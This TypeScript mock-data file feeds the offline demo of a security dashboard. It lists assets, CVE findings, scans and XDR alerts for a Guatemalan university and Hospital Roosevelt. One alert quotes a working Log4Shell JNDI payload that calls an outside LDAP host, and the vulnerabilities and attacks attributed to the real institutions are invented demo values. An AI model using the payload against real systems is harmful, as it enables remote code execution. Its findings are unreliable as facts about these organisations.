/**
 * Datos mock para modo demo offline.
 * Entidad Privada : Universidad Mariano Gálvez de Guatemala (UMG)
 * Entidad Pública : Hospital Roosevelt — Ministerio de Salud Pública GT
 */

import type { Asset, Vulnerability, ScanJob, Report, XDRAlert } from '@/types'

// ─── ACTIVOS UMG (Privada) ────────────────────────────────────────────────────

export const ASSETS_UMG: Asset[] = [
  { id: 'u1', name: 'Portal Académico UMG', asset_type: 'server', ip_address: '190.107.94.10', hostname: 'portal.umg.edu.gt', operating_system: 'Ubuntu Server 22.04 LTS', criticality: 'alta', sector_tag: 'educacion', description: 'Portal principal de estudiantes y docentes — 40,000 usuarios activos', is_active: true, last_scanned: '2025-07-24T08:00:00Z', created_at: '2024-01-10T00:00:00Z' },
  { id: 'u2', name: 'Base de Datos Académica', asset_type: 'server', ip_address: '190.107.94.20', hostname: 'db-academica.umg.edu.gt', operating_system: 'Debian 12 (Bookworm)', criticality: 'alta', sector_tag: 'educacion', description: 'PostgreSQL 16 — expedientes académicos, notas y datos de 40,000 estudiantes', is_active: true, last_scanned: '2025-07-24T08:15:00Z', created_at: '2024-01-10T00:00:00Z' },
  { id: 'u3', name: 'Servidor de Correo Institucional', asset_type: 'server', ip_address: '190.107.94.30', hostname: 'mail.umg.edu.gt', operating_system: 'CentOS Stream 9', criticality: 'alta', sector_tag: 'comunicaciones', description: 'Microsoft Exchange 2019 — 8,000 cuentas @umg.edu.gt', is_active: true, last_scanned: '2025-07-23T20:00:00Z', created_at: '2024-01-15T00:00:00Z' },
  { id: 'u4', name: 'ERP Administrativo y Financiero', asset_type: 'vm', ip_address: '192.168.10.50', hostname: 'erp.umg.edu.gt', operating_system: 'Windows Server 2022', criticality: 'alta', sector_tag: 'finanzas', description: 'SAP — nómina, contabilidad y administración universitaria', is_active: true, last_scanned: '2025-07-22T10:00:00Z', created_at: '2024-02-01T00:00:00Z' },
  { id: 'u5', name: 'Firewall Perimetral FortiGate 200F', asset_type: 'network_device', ip_address: '190.107.94.1', hostname: 'fw01.umg.edu.gt', operating_system: 'FortiOS 7.4.3', criticality: 'alta', sector_tag: 'red', description: 'Firewall principal de borde — protege toda la red universitaria', is_active: true, last_scanned: '2025-07-24T06:00:00Z', created_at: '2024-01-05T00:00:00Z' },
  { id: 'u6', name: 'Servidor LMS (Moodle)', asset_type: 'server', ip_address: '190.107.94.40', hostname: 'lms.umg.edu.gt', operating_system: 'Ubuntu 20.04 LTS', criticality: 'alta', sector_tag: 'educacion', description: 'Moodle 4.3 — plataforma de e-learning con 12,000 cursos activos', is_active: true, last_scanned: '2025-07-23T14:00:00Z', created_at: '2024-03-01T00:00:00Z' },
  { id: 'u7', name: 'Servidor Biblioteca Digital', asset_type: 'server', ip_address: '190.107.94.50', hostname: 'biblioteca.umg.edu.gt', operating_system: 'Rocky Linux 9', criticality: 'media', sector_tag: 'educacion', description: 'Repositorio digital con 200,000 recursos académicos', is_active: true, last_scanned: '2025-07-22T18:00:00Z', created_at: '2024-03-15T00:00:00Z' },
  { id: 'u8', name: 'Controlador de Dominio AD', asset_type: 'server', ip_address: '192.168.10.10', hostname: 'dc01.umg.local', operating_system: 'Windows Server 2019', criticality: 'alta', sector_tag: 'identidad', description: 'Active Directory — gestión de 6,000 cuentas corporativas', is_active: true, last_scanned: '2025-07-24T04:00:00Z', created_at: '2024-01-08T00:00:00Z' },
  { id: 'u9', name: 'Servidor Videoconferencia Zoom On-Prem', asset_type: 'container', ip_address: '192.168.10.80', hostname: null, operating_system: 'Alpine Linux 3.19', criticality: 'media', sector_tag: 'comunicaciones', description: 'Zoom Meeting Connector para clases virtuales de postgrado', is_active: true, last_scanned: '2025-07-21T10:00:00Z', created_at: '2024-04-01T00:00:00Z' },
  { id: 'u10', name: 'NAS Backup Institucional', asset_type: 'server', ip_address: '192.168.10.100', hostname: 'nas01.umg.local', operating_system: 'Synology DSM 7.2', criticality: 'alta', sector_tag: 'infraestructura', description: 'Almacenamiento NAS 120TB — respaldos institucionales y tesis digitales', is_active: true, last_scanned: '2025-07-20T22:00:00Z', created_at: '2024-02-10T00:00:00Z' },
  { id: 'u11', name: 'WAF Cloudflare — Proxy Inverso', asset_type: 'cloud_service', ip_address: null, hostname: 'umg.edu.gt', operating_system: 'Cloudflare Workers', criticality: 'alta', sector_tag: 'red', description: 'Web Application Firewall y CDN para el portal público', is_active: true, last_scanned: '2025-07-24T07:30:00Z', created_at: '2024-01-20T00:00:00Z' },
  { id: 'u12', name: 'Estaciones Laboratorio Cómputo', asset_type: 'endpoint', ip_address: '192.168.20.0', hostname: null, operating_system: 'Windows 11 Pro 23H2', criticality: 'baja', sector_tag: 'educacion', description: '180 equipos en laboratorios de cómputo — Campus zona 16', is_active: true, last_scanned: '2025-07-19T08:00:00Z', created_at: '2024-01-01T00:00:00Z' },
]

// ─── ACTIVOS HOSPITAL ROOSEVELT (Público) ─────────────────────────────────────

export const ASSETS_HOSPITAL: Asset[] = [
  { id: 'h1', name: 'HIS — Sistema Información Hospitalaria', asset_type: 'server', ip_address: '172.16.0.10', hostname: 'his.hospitalroosevelt.gob.gt', operating_system: 'Red Hat Enterprise Linux 9', criticality: 'alta', sector_tag: 'salud', description: 'OpenMRS — historia clínica electrónica de 850,000 pacientes registrados', is_active: true, last_scanned: '2025-07-24T06:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h2', name: 'PACS — Almacenamiento Imágenes Médicas', asset_type: 'server', ip_address: '172.16.0.20', hostname: 'pacs.hospitalroosevelt.gob.gt', operating_system: 'Windows Server 2019', criticality: 'alta', sector_tag: 'salud', description: 'Sistema DICOM para radiografías, tomografías y resonancias — 12TB activos', is_active: true, last_scanned: '2025-07-23T22:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h3', name: 'RIS — Radiología e Imágenes', asset_type: 'server', ip_address: '172.16.0.25', hostname: 'ris.hospitalroosevelt.gob.gt', operating_system: 'Windows Server 2016', criticality: 'alta', sector_tag: 'salud', description: 'Sistema de gestión radiológica integrado con PACS', is_active: true, last_scanned: '2025-07-23T18:00:00Z', created_at: '2023-07-01T00:00:00Z' },
  { id: 'h4', name: 'BD Pacientes PostgreSQL', asset_type: 'server', ip_address: '172.16.0.30', hostname: 'db-pacientes.hospitalroosevelt.gob.gt', operating_system: 'Ubuntu Server 20.04 LTS', criticality: 'alta', sector_tag: 'salud', description: 'Base de datos principal — datos demográficos, diagnósticos y tratamientos', is_active: true, last_scanned: '2025-07-24T05:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h5', name: 'Servidor Farmacia y Medicamentos', asset_type: 'vm', ip_address: '172.16.1.10', hostname: 'farmacia.hospitalroosevelt.gob.gt', operating_system: 'Windows Server 2022', criticality: 'alta', sector_tag: 'salud', description: 'Control de inventario de medicamentos — Bodega Central y 12 servicios', is_active: true, last_scanned: '2025-07-22T14:00:00Z', created_at: '2023-08-01T00:00:00Z' },
  { id: 'h6', name: 'Sistema Laboratorio Clínico (LIS)', asset_type: 'server', ip_address: '172.16.1.20', hostname: 'lis.hospitalroosevelt.gob.gt', operating_system: 'Ubuntu 22.04 LTS', criticality: 'alta', sector_tag: 'salud', description: 'Sistema de información de laboratorio — resultados de exámenes', is_active: true, last_scanned: '2025-07-23T10:00:00Z', created_at: '2023-09-01T00:00:00Z' },
  { id: 'h7', name: 'Red Médica VLAN UCI y Quirófanos', asset_type: 'network_device', ip_address: '172.16.2.1', hostname: 'sw-medico.hospitalroosevelt.gob.gt', operating_system: 'Cisco IOS XE 17.9', criticality: 'alta', sector_tag: 'red', description: 'Switch core que conecta UCI, quirófanos y equipos médicos críticos', is_active: true, last_scanned: '2025-07-24T02:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h8', name: 'Servidor Telemedicina', asset_type: 'server', ip_address: '172.16.3.10', hostname: 'telemedicina.hospitalroosevelt.gob.gt', operating_system: 'Debian 11', criticality: 'media', sector_tag: 'salud', description: 'Plataforma de consultas virtuales — 300 consultas diarias promedio', is_active: true, last_scanned: '2025-07-22T20:00:00Z', created_at: '2024-01-01T00:00:00Z' },
  { id: 'h9', name: 'Firewall Perimetral Palo Alto PA-450', asset_type: 'network_device', ip_address: '172.16.0.1', hostname: 'fw-hosp.hospitalroosevelt.gob.gt', operating_system: 'PAN-OS 11.1', criticality: 'alta', sector_tag: 'red', description: 'NGFW principal — segmenta red médica, administrativa y visitantes', is_active: true, last_scanned: '2025-07-24T01:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h10', name: 'Controlador Dominio MSPAS', asset_type: 'server', ip_address: '172.16.0.5', hostname: 'dc-hosp.mspas.local', operating_system: 'Windows Server 2022', criticality: 'alta', sector_tag: 'identidad', description: 'Active Directory — 1,200 cuentas de personal médico y administrativo', is_active: true, last_scanned: '2025-07-23T03:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h11', name: 'Servidor Backup y Respaldos', asset_type: 'server', ip_address: '172.16.0.40', hostname: 'backup.hospitalroosevelt.gob.gt', operating_system: 'Rocky Linux 9', criticality: 'alta', sector_tag: 'infraestructura', description: 'Veeam Backup — respaldo diario de HIS, PACS y BD de pacientes', is_active: true, last_scanned: '2025-07-23T23:00:00Z', created_at: '2023-06-01T00:00:00Z' },
  { id: 'h12', name: 'Equipos Consultorios Externos', asset_type: 'endpoint', ip_address: '172.16.4.0', hostname: null, operating_system: 'Windows 10 Pro 22H2', criticality: 'media', sector_tag: 'salud', description: '95 computadoras en consultorios externos y clínicas especializadas', is_active: true, last_scanned: '2025-07-20T08:00:00Z', created_at: '2023-06-01T00:00:00Z' },
]

// ─── VULNERABILIDADES UMG ─────────────────────────────────────────────────────

export const VULNS_UMG: Vulnerability[] = [
  { id: 'vu1', asset_id: 'u1', asset_name: 'Portal Académico UMG', cve_id: 'CVE-2021-44228', title: 'Log4Shell — RCE crítico en Apache Log4j 2', description: 'Ejecución remota de código sin autenticación mediante lookup JNDI. Afecta Log4j 2.0-beta9 hasta 2.14.1. Explotación activa confirmada a nivel mundial.', severity: 'critical', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', affected_component: 'Apache Log4j 2.14.1', status: 'open', discovered_at: '2025-07-24T08:05:00Z', resolved_at: null },
  { id: 'vu2', asset_id: 'u3', asset_name: 'Servidor de Correo Institucional', cve_id: 'CVE-2021-26855', title: 'ProxyLogon — SSRF sin autenticación en Exchange Server', description: 'Vulnerabilidad SSRF en Exchange que permite a un atacante no autenticado enviar solicitudes HTTP arbitrarias y autenticarse como servidor Exchange. Usado en ataques de estado-nación.', severity: 'critical', cvss_score: 9.8, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', affected_component: 'Microsoft Exchange 2019 CU8', status: 'open', discovered_at: '2025-07-22T16:00:00Z', resolved_at: null },
  { id: 'vu3', asset_id: 'u5', asset_name: 'Firewall Perimetral FortiGate 200F', cve_id: 'CVE-2024-21762', title: 'FortiOS SSL-VPN — RCE sin autenticación (Out-of-Bounds Write)', description: 'Escritura fuera de límites en FortiOS SSL-VPN permite ejecución remota de código arbitrario sin credenciales. Vulnerabilidad activamente explotada por grupos APT.', severity: 'critical', cvss_score: 9.6, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', affected_component: 'FortiOS 7.4.2 — SSL-VPN', status: 'open', discovered_at: '2025-07-24T06:30:00Z', resolved_at: null },
  { id: 'vu4', asset_id: 'u8', asset_name: 'Controlador de Dominio AD', cve_id: 'CVE-2020-1472', title: 'Zerologon — Escalada de privilegios a Domain Admin', description: 'Falla criptográfica en Netlogon permite a un atacante en la red comprometer cualquier DC y obtener privilegios de Domain Administrator sin credenciales.', severity: 'critical', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', affected_component: 'Windows Server 2019 — Netlogon', status: 'in_remediation', discovered_at: '2025-07-23T09:00:00Z', resolved_at: null },
  { id: 'vu5', asset_id: 'u4', asset_name: 'ERP Administrativo y Financiero', cve_id: 'CVE-2022-30190', title: 'Follina — Ejecución de código via MSDT (Microsoft Office)', description: 'La Herramienta de Diagnóstico de Soporte de Microsoft permite ejecución remota de código al abrir documentos Word maliciosos, sin necesidad de habilitar macros.', severity: 'high', cvss_score: 7.8, cvss_vector: 'CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H', affected_component: 'Windows Server 2022 — MSDT', status: 'open', discovered_at: '2025-07-21T09:00:00Z', resolved_at: null },
  { id: 'vu6', asset_id: 'u2', asset_name: 'Base de Datos Académica', cve_id: 'CVE-2023-2454', title: 'PostgreSQL — Escalada de privilegios via CREATE SCHEMA', description: 'Usuario con privilegio CREATE puede ejecutar código arbitrario con permisos de superusuario de PostgreSQL mediante esquemas maliciosos.', severity: 'high', cvss_score: 7.2, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H', affected_component: 'PostgreSQL 15.2', status: 'in_remediation', discovered_at: '2025-07-23T10:00:00Z', resolved_at: null },
  { id: 'vu7', asset_id: 'u6', asset_name: 'Servidor LMS (Moodle)', cve_id: 'CVE-2023-35132', title: 'Moodle — SQL Injection en módulo de cursos', description: 'Inyección SQL en el parámetro de búsqueda del módulo de cursos permite extraer datos de la base de datos sin autenticación de administrador.', severity: 'high', cvss_score: 8.1, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', affected_component: 'Moodle 4.1.3', status: 'open', discovered_at: '2025-07-20T11:00:00Z', resolved_at: null },
  { id: 'vu8', asset_id: 'u1', asset_name: 'Portal Académico UMG', cve_id: 'CVE-2023-44487', title: 'HTTP/2 Rapid Reset Attack (DDoS Layer 7)', description: 'Vulnerabilidad en implementación HTTP/2 que permite generar y cancelar streams masivamente causando agotamiento de recursos del servidor.', severity: 'high', cvss_score: 7.5, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', affected_component: 'Nginx 1.18.0', status: 'resolved', discovered_at: '2025-07-10T14:00:00Z', resolved_at: '2025-07-18T10:00:00Z' },
  { id: 'vu9', asset_id: 'u11', asset_name: 'WAF Cloudflare — Proxy Inverso', cve_id: null, title: 'Configuración incorrecta — Headers de seguridad faltantes', description: 'El portal no envía headers de seguridad HTTP recomendados: Content-Security-Policy, X-Frame-Options y Permissions-Policy. Exposición a ataques XSS y Clickjacking.', severity: 'medium', cvss_score: 5.3, cvss_vector: null, affected_component: 'Cloudflare — Configuración HTTP', status: 'open', discovered_at: '2025-07-18T09:00:00Z', resolved_at: null },
  { id: 'vu10', asset_id: 'u9', asset_name: 'Servidor Videoconferencia Zoom On-Prem', cve_id: null, title: 'Credenciales por defecto — Panel administración expuesto', description: 'El panel de administración del Meeting Connector es accesible con credenciales de fábrica admin/admin desde la red interna. Riesgo de toma de control total.', severity: 'medium', cvss_score: 6.5, cvss_vector: null, affected_component: 'Zoom Meeting Connector 4.6.365', status: 'open', discovered_at: '2025-07-15T12:00:00Z', resolved_at: null },
]

// ─── VULNERABILIDADES HOSPITAL ────────────────────────────────────────────────

export const VULNS_HOSPITAL: Vulnerability[] = [
  { id: 'vh1', asset_id: 'h1', asset_name: 'HIS — Sistema Información Hospitalaria', cve_id: 'CVE-2021-44228', title: 'Log4Shell — RCE en sistema de historia clínica electrónica', description: 'La plataforma OpenMRS utiliza Log4j 2.14.1 internamente. Un atacante puede ejecutar código remotamente comprometiendo registros de 850,000 pacientes. CRÍTICO bajo HIPAA/MSPAS.', severity: 'critical', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', affected_component: 'OpenMRS 2.6 / Log4j 2.14.1', status: 'open', discovered_at: '2025-07-24T06:10:00Z', resolved_at: null },
  { id: 'vh2', asset_id: 'h2', asset_name: 'PACS — Almacenamiento Imágenes Médicas', cve_id: 'CVE-2023-21554', title: 'QueueJumper — RCE en Microsoft Message Queuing (MSMQ)', description: 'Vulnerabilidad crítica en MSMQ de Windows permite ejecución remota de código sin autenticación por puerto 1801/TCP. Potencial compromiso de imágenes médicas confidenciales.', severity: 'critical', cvss_score: 9.8, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', affected_component: 'Windows Server 2019 — MSMQ', status: 'in_remediation', discovered_at: '2025-07-23T08:00:00Z', resolved_at: null },
  { id: 'vh3', asset_id: 'h9', asset_name: 'Firewall Perimetral Palo Alto PA-450', cve_id: 'CVE-2024-3400', title: 'PAN-OS GlobalProtect — RCE sin autenticación (OS Command Injection)', description: 'Inyección de comandos OS en el servicio GlobalProtect de Palo Alto Networks. CVSS 10.0 — explotación activa confirmada por CISA. El firewall que protege la red médica está comprometido.', severity: 'critical', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', affected_component: 'PAN-OS 11.1.0 — GlobalProtect', status: 'open', discovered_at: '2025-07-24T01:30:00Z', resolved_at: null },
  { id: 'vh4', asset_id: 'h10', asset_name: 'Controlador Dominio MSPAS', cve_id: 'CVE-2020-1472', title: 'Zerologon — Compromiso total del dominio hospitalario', description: 'Atacante en la red puede obtener privilegios de Domain Admin sin credenciales. Con acceso al DC, puede acceder a todos los sistemas del hospital incluyendo HIS y farmacia.', severity: 'critical', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', affected_component: 'Windows Server 2022 — Netlogon', status: 'open', discovered_at: '2025-07-22T12:00:00Z', resolved_at: null },
  { id: 'vh5', asset_id: 'h4', asset_name: 'BD Pacientes PostgreSQL', cve_id: 'CVE-2023-2454', title: 'PostgreSQL — Escalada de privilegios en base de datos de pacientes', description: 'Privilegio CREATE permite ejecutar código como superusuario en la BD que contiene datos sensibles de 850,000 pacientes. Violación grave de confidencialidad médica.', severity: 'high', cvss_score: 7.2, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H', affected_component: 'PostgreSQL 14.5', status: 'open', discovered_at: '2025-07-23T14:00:00Z', resolved_at: null },
  { id: 'vh6', asset_id: 'h3', asset_name: 'RIS — Radiología e Imágenes', cve_id: 'CVE-2022-0778', title: 'OpenSSL — Bucle infinito DoS en certificados TLS', description: 'La función BN_mod_sqrt puede entrar en bucle infinito con certificados EC maliciosos, causando denegación de servicio en el sistema de radiología durante procedimientos críticos.', severity: 'high', cvss_score: 7.5, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', affected_component: 'OpenSSL 1.1.1k', status: 'open', discovered_at: '2025-07-21T16:00:00Z', resolved_at: null },
  { id: 'vh7', asset_id: 'h5', asset_name: 'Servidor Farmacia y Medicamentos', cve_id: null, title: 'Control de acceso insuficiente — Modificación de inventario no autorizada', description: 'Múltiples usuarios con perfil "lectura" pueden modificar inventario de medicamentos controlados debido a falla en validación de permisos del backend. Riesgo de alteración de stock.', severity: 'high', cvss_score: 7.1, cvss_vector: null, affected_component: 'Sistema Farmacia v3.2', status: 'open', discovered_at: '2025-07-19T10:00:00Z', resolved_at: null },
  { id: 'vh8', asset_id: 'h6', asset_name: 'Sistema Laboratorio Clínico (LIS)', cve_id: null, title: 'Transmisión HL7 sin cifrado — Resultados de laboratorio en texto plano', description: 'Los mensajes HL7 v2 entre el LIS y el HIS se transmiten sin cifrado TLS por la red interna. Cualquier equipo en la VLAN puede capturar resultados de exámenes de pacientes.', severity: 'high', cvss_score: 6.8, cvss_vector: null, affected_component: 'HL7 Interface Engine v2.3', status: 'open', discovered_at: '2025-07-18T08:00:00Z', resolved_at: null },
  { id: 'vh9', asset_id: 'h7', asset_name: 'Red Médica VLAN UCI y Quirófanos', cve_id: 'CVE-2023-20198', title: 'Cisco IOS XE — RCE sin autenticación en Web UI', description: 'Vulnerabilidad crítica en la interfaz web de Cisco IOS XE permite crear cuenta de privilegio 15 sin autenticación. El switch que conecta UCI y quirófanos podría ser tomado.', severity: 'critical', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', affected_component: 'Cisco IOS XE 17.9.1 — Web UI', status: 'in_remediation', discovered_at: '2025-07-20T15:00:00Z', resolved_at: null },
  { id: 'vh10', asset_id: 'h8', asset_name: 'Servidor Telemedicina', cve_id: null, title: 'Certificado TLS expirado — Consultas médicas sin cifrado válido', description: 'El certificado SSL del portal de telemedicina expiró hace 23 días. Las videoconsultas médico-paciente se realizan con advertencia de seguridad, exponiendo datos clínicos sensibles.', severity: 'medium', cvss_score: 5.9, cvss_vector: null, affected_component: 'Nginx — Certificado TLS', status: 'open', discovered_at: '2025-07-15T09:00:00Z', resolved_at: null },
]

// ─── ESCANEOS ─────────────────────────────────────────────────────────────────

export const MOCK_SCANS: ScanJob[] = [
  { id: 's1', target: '190.107.94.0/28', scan_type: 'full', status: 'completed', celery_task_id: 'abc-111', asset_id: 'u1', started_at: '2025-07-24T08:00:00Z', completed_at: '2025-07-24T08:22:00Z', error_message: null, created_at: '2025-07-24T07:58:00Z' },
  { id: 's2', target: '192.168.10.0/24', scan_type: 'quick', status: 'completed', celery_task_id: 'abc-222', asset_id: 'u4', started_at: '2025-07-23T20:00:00Z', completed_at: '2025-07-23T20:08:00Z', error_message: null, created_at: '2025-07-23T19:58:00Z' },
  { id: 's3', target: '172.16.0.0/24', scan_type: 'full', status: 'completed', celery_task_id: 'abc-333', asset_id: 'h1', started_at: '2025-07-22T10:00:00Z', completed_at: '2025-07-22T10:34:00Z', error_message: null, created_at: '2025-07-22T09:58:00Z' },
  { id: 's4', target: '190.107.94.0/28', scan_type: 'scheduled', status: 'running', celery_task_id: 'abc-444', asset_id: null, started_at: '2025-07-25T02:00:00Z', completed_at: null, error_message: null, created_at: '2025-07-25T02:00:00Z' },
]

// ─── REPORTES ─────────────────────────────────────────────────────────────────

export const MOCK_REPORTS: Report[] = [
  { id: 'r1', title: 'Evaluación ISO 27001 — UMG Q3 2025', standard: 'iso27001', format: 'pdf', status: 'ready', signed: true, file_path: '/reports/r1.pdf', created_at: '2025-07-20T09:00:00Z' },
  { id: 'r2', title: 'NIST CSF 2.0 — Hospital Roosevelt Semestral', standard: 'nist', format: 'pdf', status: 'ready', signed: false, file_path: '/reports/r2.pdf', created_at: '2025-07-15T14:00:00Z' },
  { id: 'r3', title: 'CIS Controls v8 — Auditoría Interna UMG', standard: 'cis', format: 'pdf', status: 'ready', signed: true, file_path: '/reports/r3.pdf', created_at: '2025-07-10T11:00:00Z' },
  { id: 'r4', title: 'Ley Ciberseguridad GT — Cumplimiento MSPAS', standard: 'ley_gt', format: 'pdf', status: 'generating', signed: false, file_path: null, created_at: '2025-07-25T01:00:00Z' },
]

// ─── ALERTAS XDR ──────────────────────────────────────────────────────────────

export const MOCK_XDR_ALERTS: XDRAlert[] = [
  { id: 'x1', type: 'alert', severity: 'critical', title: 'Intento de explotación Log4Shell — Portal Académico', source: 'network', asset_id: 'u1', description: 'Petición HTTP con payload JNDI malicioso detectada: ${jndi:ldap://185.220.101.45:1389/a}. IP origen: nodo TOR. WAF bloqueó pero el servidor interno es vulnerable.', timestamp: new Date(Date.now() - 120000).toISOString() },
  { id: 'x2', type: 'alert', severity: 'critical', title: 'Ransomware — Actividad de cifrado en servidor HIS', source: 'endpoint', asset_id: 'h1', description: 'Proceso java.exe iniciando cifrado masivo en /opt/openmrs/data. Extensión .lockbit3 detectada. Historia clínica de pacientes en riesgo. Host aislado automáticamente.', timestamp: new Date(Date.now() - 300000).toISOString() },
  { id: 'x3', type: 'alert', severity: 'high', title: 'Escaneo masivo de puertos desde IP externa', source: 'network', asset_id: 'u5', description: '14,230 paquetes SYN en 45 segundos desde 91.189.91.42 (AS200651). Posible reconocimiento previo a ataque dirigido. Bloqueado por FortiGate IPS.', timestamp: new Date(Date.now() - 600000).toISOString() },
  { id: 'x4', type: 'alert', severity: 'high', title: 'Movimiento lateral — Pass-the-Hash en red hospitalaria', source: 'identity', asset_id: 'h10', description: 'Credenciales NTLM reutilizadas desde workstation-UCI-03 hacia DC-HOSP. Técnica MITRE ATT&CK T1550.002. Usuario comprometido: svc_backup.', timestamp: new Date(Date.now() - 900000).toISOString() },
]

// ─── MÉTRICAS DASHBOARD ───────────────────────────────────────────────────────

export const METRICS_UMG = {
  total_assets: 12, critical_vulnerabilities: 4, high_vulnerabilities: 4,
  open_vulnerabilities: 8, resolved_last_30d: 3, active_scans: 1,
  assets_by_criticality: [{ name: 'Alta', value: 9 }, { name: 'Media', value: 2 }, { name: 'Baja', value: 1 }],
  vulns_by_severity: [{ name: 'Crítica', value: 4, color: '#ef4444' }, { name: 'Alta', value: 4, color: '#f97316' }, { name: 'Media', value: 2, color: '#eab308' }, { name: 'Resuelta', value: 1, color: '#22c55e' }],
  scans_last_7d: [{ date: 'Dom', count: 1 }, { date: 'Lun', count: 3 }, { date: 'Mar', count: 2 }, { date: 'Mié', count: 4 }, { date: 'Jue', count: 2 }, { date: 'Vie', count: 5 }, { date: 'Sáb', count: 1 }],
}

export const METRICS_HOSPITAL = {
  total_assets: 12, critical_vulnerabilities: 5, high_vulnerabilities: 4,
  open_vulnerabilities: 9, resolved_last_30d: 1, active_scans: 1,
  assets_by_criticality: [{ name: 'Alta', value: 10 }, { name: 'Media', value: 2 }, { name: 'Baja', value: 0 }],
  vulns_by_severity: [{ name: 'Crítica', value: 5, color: '#ef4444' }, { name: 'Alta', value: 4, color: '#f97316' }, { name: 'Media', value: 2, color: '#eab308' }, { name: 'Resuelta', value: 0, color: '#22c55e' }],
  scans_last_7d: [{ date: 'Dom', count: 2 }, { date: 'Lun', count: 1 }, { date: 'Mar', count: 3 }, { date: 'Mié', count: 2 }, { date: 'Jue', count: 4 }, { date: 'Vie', count: 1 }, { date: 'Sáb', count: 2 }],
}

// ─── ENTIDADES DEMO ───────────────────────────────────────────────────────────

export const DEMO_ENTITIES = [
  {
    id: 'umg',
    label: 'Sector Privado',
    name: 'Universidad Mariano Gálvez de Guatemala',
    shortName: 'UMG',
    sector: 'Educación Superior Privada',
    emoji: '🎓',
    color: 'blue',
    profile: { id: 'u-admin', email: 'admin@umg.edu.gt', full_name: 'Administrador TI — UMG', role: 'admin' as const, organization_id: 'org-umg', mfa_enabled: true },
    assets: ASSETS_UMG,
    vulns: VULNS_UMG,
    metrics: METRICS_UMG,
    defaultPlan: 'basic' as const,
  },
  {
    id: 'hospital',
    label: 'Sector Público',
    name: 'Hospital Roosevelt — MSPAS Guatemala',
    shortName: 'Hospital Roosevelt',
    sector: 'Salud Pública — Ministerio de Salud',
    emoji: '🏥',
    color: 'green',
    profile: { id: 'h-admin', email: 'admin@hospitalroosevelt.gob.gt', full_name: 'Jefe de Informática — Hospital Roosevelt', role: 'admin' as const, organization_id: 'org-hospital', mfa_enabled: true },
    assets: ASSETS_HOSPITAL,
    vulns: VULNS_HOSPITAL,
    metrics: METRICS_HOSPITAL,
    defaultPlan: 'basic' as const,
  },
]

export type DemoEntityId = 'umg' | 'hospital'

// ─── ALERTAS LIVE DEMO ────────────────────────────────────────────────────────

export const LIVE_DEMO_ALERTS: Omit<XDRAlert, 'id' | 'timestamp'>[] = [
  { type: 'alert', severity: 'critical', title: 'Ransomware LockBit 3.0 — Cifrado activo detectado', source: 'endpoint', description: 'Proceso svchost.exe cifrando archivos en C:\\. Extensión .lockbit3. Host aislado automáticamente de la red.' },
  { type: 'alert', severity: 'high', title: 'Exfiltración DNS — Tunneling hacia C2 externo', source: 'network', description: '1,847 consultas DNS a subdominio aleatorio en 90 segundos. IOC confirmado: familia malware Cobalt Strike.' },
  { type: 'alert', severity: 'high', title: 'Credential Stuffing — Fuerza bruta portal web', source: 'identity', description: '312 intentos de login en 3 minutos desde 23 IPs distintas. Lista de credenciales filtradas de breach externo.' },
  { type: 'alert', severity: 'medium', title: 'Acceso privilegiado fuera de horario laboral', source: 'identity', description: 'Cuenta de servicio svc_backup accedió a shares administrativos a las 02:17 AM. Comportamiento inusual según baseline.' },
]
